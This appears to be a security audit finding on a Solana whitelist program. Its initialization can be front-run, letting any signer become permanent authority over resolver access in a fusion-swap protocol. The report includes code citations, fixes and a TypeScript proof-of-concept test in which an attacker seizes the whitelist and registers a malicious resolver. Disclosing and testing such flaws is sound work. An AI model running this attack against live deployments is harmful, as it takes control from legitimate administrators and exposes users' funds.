# Audit Report

## Title
**Critical PDA Front-Running Vulnerability in Whitelist Initialization Enables Complete Protocol Access Control Takeover**

## Summary
The whitelist program's `initialize()` function uses a predictable PDA with a constant seed and lacks authorization constraints, allowing any attacker to front-run the legitimate initialization transaction and permanently seize control of the resolver whitelist system, thereby controlling all order execution in the fusion-swap protocol.

## Finding Description

The whitelist program contains a critical initialization vulnerability that enables complete access control takeover through three design flaws:

**1. Predictable PDA Derivation**

The `whitelist_state` PDA is derived using only a constant seed without any dynamic components. [1](#0-0)  The PDA account constraints show this predictable derivation pattern. [2](#0-1) 

The utility functions used throughout the codebase confirm this deterministic PDA computation pattern. [3](#0-2) [4](#0-3) 

**2. No Authorization Constraints**

The `initialize()` function accepts any signer as the authority without validation. [5](#0-4)  The `Initialize` struct definition confirms there are no authority validation constraints - any signer can become the authority. [6](#0-5) 

**3. One-Time Initialization Lock**

The `init` constraint prevents re-initialization, making any front-running attack permanent. [2](#0-1) 

**Attack Execution:**

1. Attacker observes whitelist program deployment [7](#0-6) 
2. Attacker computes the predictable PDA address using the constant seed
3. Attacker submits `initialize()` transaction with high priority fees
4. Attacker's transaction executes first, setting their pubkey as authority
5. Legitimate initialization transaction fails (account already initialized)
6. Attacker permanently controls resolver registration

**Impact on Protocol Security:**

The whitelist authority controls who can execute critical fusion-swap operations. The `Fill` instruction explicitly requires a valid `resolver_access` account from the whitelist program. [8](#0-7) 

Similarly, the `CancelByResolver` instruction requires resolver access validation. [9](#0-8) 

Only the whitelist authority can register resolvers through the `register()` function, which enforces authority validation. [10](#0-9)  The same authority constraint applies to `deregister()`. [11](#0-10) 

With whitelist control, an attacker can:
- Register only malicious resolvers under their control
- Prevent legitimate resolvers from being registered
- Deregister existing resolvers to halt protocol operations
- Extract value from all orders through controlled resolver execution

## Impact Explanation

**Severity: CRITICAL**

This vulnerability enables complete protocol compromise:

1. **Total Access Control Takeover**: The attacker gains permanent authority over the whitelist system, controlling which resolvers can interact with the protocol. This is the most privileged position in the protocol's access control hierarchy.

2. **Irreversible Without Redeployment**: Once exploited, recovery requires redeploying both the whitelist and fusion-swap programs with new program IDs, coordinating all users, integrations, and liquidity providers.

3. **Protocol-Wide Impact**: Affects all users of the fusion-swap protocol since order filling and resolver-based cancellations depend on authorized resolvers.

4. **Economic Exploitation**: Attacker-controlled resolvers can manipulate order execution to extract value from all orders, fill orders at unfavorable prices, or selectively refuse to fill orders.

5. **Permanent Lock-Out**: Legitimate protocol administrators are permanently prevented from managing resolver access, effectively losing control of their own protocol.

The vulnerability breaks the core **Access Control** invariant - unauthorized actors should not control protocol permissions. It also exploits **PDA Security** weaknesses - predictable PDA derivation enables account takeover.

## Likelihood Explanation

**Likelihood: HIGH**

The attack is highly likely to occur:

1. **Zero Technical Barriers**: Computing the PDA and calling `initialize()` requires no special permissions or complex exploit techniques - any user with basic Solana knowledge can execute this.

2. **Public Information**: The program ID becomes publicly visible on-chain immediately after deployment, giving attackers all information needed.

3. **Economic Incentive**: Complete control over a DeFi protocol's order execution mechanism provides massive financial incentive worth millions in potential extracted value.

4. **Transaction Ordering**: Solana's priority fee mechanism allows attackers to ensure their transaction processes before the legitimate initialization.

5. **Visible Attack Window**: The necessary gap between program deployment and initialization creates an obvious and unavoidable attack window.

6. **Standard Attack Pattern**: This is a well-known vulnerability class in Solana programs. Sophisticated attackers actively monitor for program deployments to exploit such initialization vulnerabilities.

## Recommendation

**Immediate Fix Required:**

Add an authority constraint to the `initialize()` function:

```rust
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(
        mut,
        // Add constraint to validate expected authority
        constraint = authority.key() == EXPECTED_AUTHORITY_PUBKEY @ WhitelistError::Unauthorized
    )]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

Where `EXPECTED_AUTHORITY_PUBKEY` is the hardcoded pubkey of the intended deployer/authority.

**Alternative Solution:**

Use a more complex PDA seed that includes the authority's pubkey:

```rust
seeds = [WHITELIST_STATE_SEED, authority.key().as_ref()]
```

This makes the PDA unique per authority, though it changes the protocol architecture.

**Deployment Procedure:**

If redeploying, ensure the initialization transaction is submitted atomically or immediately after deployment with maximum priority fees to minimize the attack window.

## Proof of Concept

```typescript
import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Whitelist } from "../target/types/whitelist";
import { Keypair, PublicKey } from "@solana/web3.js";

describe("PDA Front-Running Attack", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const whitelistProgram = anchor.workspace.Whitelist as Program<Whitelist>;
  
  it("Attacker front-runs whitelist initialization", async () => {
    // Attacker's keypair
    const attacker = Keypair.generate();
    
    // Airdrop SOL to attacker
    await provider.connection.requestAirdrop(
      attacker.publicKey,
      2 * anchor.web3.LAMPORTS_PER_SOL
    );
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Attacker computes the predictable PDA
    const [whitelistStatePDA] = PublicKey.findProgramAddressSync(
      [Buffer.from("whitelist_state")],
      whitelistProgram.programId
    );
    
    // Attacker front-runs initialization with their own keypair
    await whitelistProgram.methods
      .initialize()
      .accounts({
        authority: attacker.publicKey,
        whitelistState: whitelistStatePDA,
      })
      .signers([attacker])
      .rpc();
    
    // Verify attacker now controls the whitelist
    const whitelistState = await whitelistProgram.account.whitelistState.fetch(
      whitelistStatePDA
    );
    
    console.log("Whitelist authority:", whitelistState.authority.toString());
    console.log("Attacker pubkey:", attacker.publicKey.toString());
    
    assert.equal(
      whitelistState.authority.toString(),
      attacker.publicKey.toString(),
      "Attacker successfully seized whitelist control"
    );
    
    // Legitimate initialization attempt will fail
    const legitimateAuthority = Keypair.generate();
    await provider.connection.requestAirdrop(
      legitimateAuthority.publicKey,
      2 * anchor.web3.LAMPORTS_PER_SOL
    );
    
    try {
      await whitelistProgram.methods
        .initialize()
        .accounts({
          authority: legitimateAuthority.publicKey,
          whitelistState: whitelistStatePDA,
        })
        .signers([legitimateAuthority])
        .rpc();
      
      assert.fail("Legitimate initialization should have failed");
    } catch (error) {
      console.log("Legitimate initialization failed as expected:", error.message);
      assert.ok(error.message.includes("already in use"));
    }
    
    // Attacker can now register malicious resolvers
    const maliciousResolver = Keypair.generate();
    
    const [resolverAccessPDA] = PublicKey.findProgramAddressSync(
      [Buffer.from("resolver_access"), maliciousResolver.publicKey.toBuffer()],
      whitelistProgram.programId
    );
    
    await whitelistProgram.methods
      .register(maliciousResolver.publicKey)
      .accounts({
        authority: attacker.publicKey,
        whitelistState: whitelistStatePDA,
        resolverAccess: resolverAccessPDA,
      })
      .signers([attacker])
      .rpc();
    
    console.log("Attacker successfully registered malicious resolver");
  });
});
```

## Notes

This vulnerability represents a fundamental flaw in the initialization pattern. The protocol's security model assumes the whitelist authority is a trusted entity, but the initialization mechanism allows any untrusted actor to become that authority.

The vulnerability is exacerbated by Solana's atomic transaction execution model - there is no way to deploy and initialize in a single atomic operation using standard tooling. The window between deployment and initialization is unavoidable, making this attack vector always available unless authorization constraints are added to the initialization function itself.

The impact extends beyond just resolver access control. Since the fusion-swap protocol's core functionality (order filling and resolver-based cancellations) depends entirely on the whitelist system, compromising the whitelist effectively compromises the entire protocol. An attacker with whitelist control can shut down the protocol, manipulate order execution, or extract value from all users.

### Citations

**File:** programs/whitelist/src/lib.rs (L7-7)
```rust
declare_id!("5jzZhrzqkbdwp5d3J1XbmaXMRnqeXimM1mDMoGHyvR7S");
```

**File:** programs/whitelist/src/lib.rs (L9-9)
```rust
pub const WHITELIST_STATE_SEED: &[u8] = b"whitelist_state";
```

**File:** programs/whitelist/src/lib.rs (L18-22)
```rust
    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        let whitelist_state = &mut ctx.accounts.whitelist_state;
        whitelist_state.authority = ctx.accounts.authority.key();
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L43-58)
```rust
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L62-84)
```rust
pub struct Register<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can register new users
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + ResolverAccess::INIT_SPACE,
        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
        bump,
    )]
    pub resolver_access: Account<'info, ResolverAccess>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L86-109)
```rust
#[derive(Accounts)]
#[instruction(user: Pubkey)]
pub struct Deregister<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can deregister users from the whitelist
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    #[account(
        mut,
        close = authority,
        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
        bump,
    )]
    pub resolver_access: Account<'info, ResolverAccess>,

    pub system_program: Program<'info, System>,
}
```

**File:** scripts/utils.ts (L126-132)
```typescript
export function findWhitelistStateAddress(programId: PublicKey): PublicKey {
  const [whitelistState] = PublicKey.findProgramAddressSync(
    [anchor.utils.bytes.utf8.encode("whitelist_state")],
    programId
  );

  return whitelistState;
```

**File:** tests/utils/utils.ts (L477-480)
```typescript
  const [whitelistStatePDA] = anchor.web3.PublicKey.findProgramAddressSync(
    [Buffer.from("whitelist_state")],
    program.programId
  );
```

**File:** programs/fusion-swap/src/lib.rs (L510-516)
```rust
    /// Account allowed to fill the order
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, taker.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** programs/fusion-swap/src/lib.rs (L647-653)
```rust
    /// Account allowed to cancel the order
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, resolver.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```
